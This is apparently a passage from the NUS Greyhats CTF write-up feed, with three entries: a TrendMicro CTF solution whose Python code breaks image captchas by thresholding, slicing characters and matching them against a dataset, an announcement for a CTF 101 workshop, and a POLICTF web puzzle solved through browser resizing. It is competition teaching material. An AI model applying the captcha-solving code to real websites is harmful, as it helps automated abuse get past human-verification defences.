&lt;p&gt;The challenge description was a website, upon entering the website, you are allowed to register/sign in.&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;
	After registering and logging in, you are shown a captcha, and it seems that the challenge was to solve 500 consecutive captchas without any mistakes. However, it seems that you are able to skip captchas by refreshing the page (this turned out to be very useful).&lt;br /&gt;&lt;br /&gt;
	Captchas looks like this:
&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/captcha.png&quot; width=&quot;30%&quot; height=&quot;30%&quot; /&gt;&lt;img src=&quot;/write-ups/resources/images/captcha2.png&quot; width=&quot;30%&quot; height=&quot;30%&quot; /&gt;&lt;/center&gt;
&lt;p&gt;
	To automatically solve all 500 captchas, we wrote a python script using the Python Imaging Library. The trick to solving the captchas was to do some pre-processing and to build a dataset of good characters which we will be using to solve new captchas.	
	&lt;br /&gt;
	&lt;h3&gt;Processing&lt;/h3&gt;
	&lt;b&gt;Turn background/noise to white, and text to black&lt;/b&gt;
	Scan the entire picture and rank the colours by frequency, the background colour would have the highest frequency followed by the text
&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/processed.jpg&quot; width=&quot;30%&quot; height=&quot;30%&quot; /&gt;&lt;/center&gt;
&lt;p&gt;
	&lt;b&gt;Dynamically slice the image by characters&lt;/b&gt;
  For each X coordinate, if the Y coordinates along the X coordinate has a black pixel:&lt;br /&gt;
  set inLetter = true&lt;br /&gt;
  Keep going along X until you reach a X where there is no black pixel along it, then you have your starting and ending x coordinate for your character!
&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;for y in range(im2.size[0]): # slice across
  for x in range(im2.size[1]): # slice down
    pix = im2.getpixel((y,x))
    if pix != 255:
      inletter = True
      last = y
  if foundletter == False and inletter == True:
    foundletter = True
    start = y

  if foundletter == True and inletter == False:
    end = y
    if end-last &amp;gt; 3 and end-start &amp;gt; 20:
      foundletter=False
      letters.append((start-3,end))
  inletter=False&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;
    With that, you can build a dataset of characters to use for comparison:
&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/dataset.png&quot; width=&quot;25%&quot; height=&quot;25%&quot; /&gt;&lt;/center&gt;
&lt;p&gt;
	So now, we process new captchas similarly, and slice them up into characters for comparison with our dataset.&lt;br /&gt;
	The code for comparison is as follows:
&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;class VectorCompare:
  def magnitude(self,concordance):
    total = 0
    for word,count in concordance.iteritems():
      total += count ** 2
    return math.sqrt(total)

  def relation(self,concordance1, concordance2):
    relevance = 0
    topvalue = 0
    for word, count in concordance1.iteritems():
      if concordance2.has_key(word):
        topvalue += count * concordance2[word]
    return topvalue / (self.magnitude(concordance1) * self.magnitude(concordance2))

def buildvector(im):
  d1 = {}

  count = 0
  for i in im.getdata():
    d1[count] = i
    count += 1

  return d1

def crack(img):
  im = img
  im = im.convert(&amp;quot;RGBA&amp;quot;)
  his = im.load()
  v = VectorCompare()

  imageset = []

  for img in os.listdir(&amp;#39;./iconset4/&amp;#39;):
    temp = []
    if img != &amp;quot;Thumbs.db&amp;quot; and img != &amp;quot;.DS_Store&amp;quot;: # windows check...
      imgs = Image.open(&amp;quot;./iconset4/%s&amp;quot;%(img))
      imgs = imgs.convert(&amp;quot;P&amp;quot;)
      temp.append(buildvector(imgs))
    imageset.append({img[0:2]:temp})


  values = {}

  for y in xrange(im.size[1]):
      for x in xrange(im.size[0]):
        values[x,y] = his[x,y]

  count = {}
  for j,k in sorted(values.items(), key=itemgetter(1), reverse=True):
    if (k &amp;gt; 0 ):
      if k in count:
        count[k] = count[k]+1
      else:
        count[k] = 1

  a = sorted(count.items(), key=itemgetter(1), reverse=True)
  text = a[1][0]
  im2 = Image.new(&amp;quot;P&amp;quot;,im.size,255)


  for x in range(im.size[1]):
    for y in range(im.size[0]):
      pix = im.getpixel((y,x))
      if pix == text:
        pix = (0,0,0,0)
      else:
        pix = (255,255,255,255)
      im2.putpixel((y,x),pix[2])

  guessword = &amp;quot;&amp;quot;
  letters =[]
  inletter = False
  foundletter=False
  start = 0
  end = 0
  last = 0
  for y in range(im2.size[0]): # slice across
    for x in range(im2.size[1]): # slice down
      pix = im2.getpixel((y,x))
      if pix != 255:
        inletter = True
        last = y
    if foundletter == False and inletter == True:
      foundletter = True
      start = y

    if foundletter == True and inletter == False:
      end = y
      if end-last &amp;gt; 3 and end-start &amp;gt; 20:
        foundletter=False
        letters.append((start-3,end))
    inletter=False

  results = []
  for letter in letters:
    m = hashlib.md5()
    img4 = im2.crop(( letter[0] , 0, letter[1],im2.size[1] ))
    guess = []
    for image in imageset:
      for x,y in image.iteritems():
        if len(y) != 0:
          guess.append( ( v.relation(y[0],buildvector(img4)),x.decode(&amp;#39;hex&amp;#39;)) )
    guess.sort(reverse=True)
    results.append(guess[0])

  return results

def main():
  img= Image.open(&amp;quot;image.png&amp;quot;)
  print crack(img)
  
if __name__ == &amp;quot;__main__&amp;quot;:
    main()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;
  To achieve a 100% accuracy, we need to reject certain solutions that contains risk, to do this, we reject a solution if any of the characters has a similarity score that is less that 0.99. With this, we were able to achieve a 100% accuracy with a rejection rate of ~1 per captcha.
  &lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/captcharesults.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/center&gt;
  
  After about ~2 hours, our script finally solve all 500 captchas.
  &lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/flag.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/center&gt;
&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;And we have our flag: &lt;b&gt;TMCTF{217dae3fd34cee799658d4552e37827f}&lt;/b&gt;&lt;/p&gt;


    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/TrendMicroCTF-500-Captchas!-(Misc-300)/&quot;&gt;TrendMicroCTF - 500 Captchas! (Misc 300)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on October 08, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[Capture The Flag 101 Workshop]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/Capture-The-Flag-101-Workshop/" />
  <id>https://nusgreyhats.github.io/write-ups/Capture-The-Flag-101-Workshop</id>
  <published>2015-08-09T00:00:00+08:00</published>
  <updated>2015-08-09T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/ctf101/thectf.jpg&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/center&gt;
&lt;p&gt;
NUS Greyhats Capture The Flag 101 is a capture-the-flag (CTF) style workshop that will be spanned over two Saturdays. Participants will learn techniques and tools to exploit software vulnerabilities to uncover secret flags hidden in various challenge. This workshop is designed to be progressive and is beginner friendly. In addition, we will have a live CTF scoreboard to show your ranking :)  
&lt;/p&gt;
&lt;p&gt;
You can sign up for the event &lt;a href=&quot;https://docs.google.com/forms/d/1ppvnaRWzhwuSZ60CIKem4E37eyLQMbfltEw_xmutMBU/&quot;&gt;here&lt;/a&gt; (while stocks last).
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;Date:&lt;/b&gt; 15 and 22 August 2015&lt;br /&gt;
&lt;b&gt;Time:&lt;/b&gt; 1PM - 5PM&lt;br /&gt;
&lt;b&gt;Venue:&lt;/b&gt; School of Computing COM 1 Seminar Room 3 &lt;br /&gt;
(Registration from 12.30PM onwards)
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;15 August 2015&lt;/b&gt;&lt;br /&gt;
This session will focus on systems security which includes topics in source code auditing, representation of code as data, exploitation of insecure scripts, exploitation of format string bugs, and exploitation of memory corruption bugs.
&lt;/p&gt;

&lt;p&gt;&lt;b&gt;22 August 2015&lt;/b&gt;
This session will focus on web security which includes topics on the web environment cross site scripting, cross site request forgery, SQL injection and command injection. &lt;/p&gt;

&lt;hr /&gt;
&lt;h2&gt;What to bring?&lt;/h2&gt;
&lt;p&gt;Please bring along your laptop to complete the challenges. &lt;/p&gt;

&lt;p&gt;As with a typical CTF, it is good to come prepare with the tools needed. For CTF 101, we recommend that you have the following&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A Linux environment with your favourite scripting language (such as python), binutils, gcc, and gdb installed*&lt;/li&gt;
&lt;li&gt;An SSH client&lt;/li&gt;
&lt;li&gt;Browsers such as Firefox and Chrome &lt;/li&gt;
&lt;li&gt;Browsers extension such as&lt;br /&gt;
&lt;b&gt;Cookie manager:&lt;/b&gt; https://addons.mozilla.org/En-us/firefox/addon/cookies-manager-plus/ &lt;br /&gt;
&lt;b&gt;Tamper-data:&lt;/b&gt; https://addons.mozilla.org/en-US/firefox/addon/tamper-data&lt;/li&gt;
&lt;li&gt;Intercepting proxy such as Burp (https://portswigger.net/burp/ )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;**You may wish to install this in a virtual machine. If you do not have any virtualisation software, you may want to consider VirtualBox (https://www.virtualbox.org). &lt;/p&gt;

&lt;hr /&gt;

&lt;h2&gt;Frequently Asked Question:&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;I am not a student in NUS. Can I join this event? 
Yes. However, due to venue constraint, priority will be given to NUS student. Do note that this workshop will require internet access. Non-NUS student will need to source for their own internet access (eg. 3G/4G network) &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;


    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/Capture-The-Flag-101-Workshop/&quot;&gt;Capture The Flag 101 Workshop&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on August 09, 2015.&lt;/p&gt;
  </content>
</entry>


  

<entry>
  <title type="html"><![CDATA[POLICTF 2015 Write Up - John the Traveller (Web)]]></title>
  <link rel="alternate" type="text/html" href="https://nusgreyhats.github.io/write-ups/polictf-2015-write-up-john-the-traveller-(web)/" />
  <id>https://nusgreyhats.github.io/write-ups/polictf-2015-write-up-john-the-traveller-(web)</id>
  <published>2015-08-03T00:00:00+08:00</published>
  <updated>2015-08-03T00:00:00+08:00</updated>
  <author>
    <name></name>
    <uri>https://nusgreyhats.github.io/write-ups</uri>
    
  </author>
  <content type="html">
    &lt;div class=&quot;holder&quot;&gt;   
				&lt;p&gt;
					Holidays are here! But John still hasn&#39;t decided where to spend them and time is running out: flights are overbooked and prices are rising every second. Fortunately, John just discovered a website where he can book last second flight to all the European capitals; however, there&#39;s no time to waste, so he just grabs his suitcase and thanks to his new smartphone he looks the city of his choice up while rushing to the airport. There he goes! Flight is booked so... hauskaa lomaa! &lt;br /&gt;&lt;br /&gt;
					&lt;a href=&quot;http://traveller.polictf.it/&quot;&gt;http://traveller.polictf.it/&lt;/a&gt;
				&lt;/p&gt;
				&lt;hr /&gt;
	
				&lt;p&gt;
					We visited the site and saw the following page. &lt;br /&gt;&lt;br /&gt;
					&lt;/p&gt;&lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/polictf/travellersite.JPG&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/center&gt;
				&lt;p&gt;&lt;/p&gt;
				&lt;br /&gt;
				&lt;p&gt;
				We tried to key into some arbitrary city, however, it returns back the same page. Looking back at the challenge description, we noticed something that stands out - &lt;b&gt;hauskaa lomaa&lt;/b&gt;. A search revealed that these two words is actually Finnish. We also found out that the capital of Finland is &lt;b&gt;Helsinki&lt;/b&gt;. Entering that into the search field and we got ....
					&lt;br /&gt;&lt;br /&gt;
					&lt;/p&gt;&lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/polictf/helsinki.JPG&quot; width=&quot;75%&quot; height=&quot;75%&quot; /&gt;&lt;/center&gt;
				&lt;p&gt;&lt;/p&gt;
				
				&lt;br /&gt;
				&lt;p&gt;
					Great. So the next step is to try and book the ticket. But how do we do so? The price is in px. Does it mean pixels?  The challenge also mentioned &quot;he just grabs his suitcase and thanks to his new smartphone&quot;. Let&#39;s try to adjust our browser size to one of the pixel size using Chrome browser dev tools. 
					&lt;br /&gt;&lt;br /&gt;
					&lt;/p&gt;&lt;center&gt;&lt;img src=&quot;/write-ups/resources/images/polictf/devtools.JPG&quot; width=&quot;25%&quot; height=&quot;25%&quot; /&gt;&lt;/center&gt;
				&lt;p&gt;&lt;/p&gt;

				&lt;br /&gt;
				&lt;p&gt;
					Bingo!! Decoding from the QR Code and we got the flag
				&lt;/p&gt;
				
				&lt;br /&gt;
				&lt;p align=&quot;center&quot;&gt;
					&lt;b&gt;flag{run_to_the_hills_run_for_your_life}&lt;/b&gt;
				&lt;/p&gt;
			&lt;/div&gt;

    &lt;p&gt;&lt;a href=&quot;https://nusgreyhats.github.io/write-ups/polictf-2015-write-up-john-the-traveller-(web)/&quot;&gt;POLICTF 2015 Write Up - John the Traveller (Web)&lt;/a&gt; was originally published by NUS Greyhats at &lt;a href=&quot;https://nusgreyhats.github.io/write-ups&quot;&gt;NUS Greyhats&lt;/a&gt; on August 03, 2015.&lt;/p&gt;
  </content>
</entry>

</feed>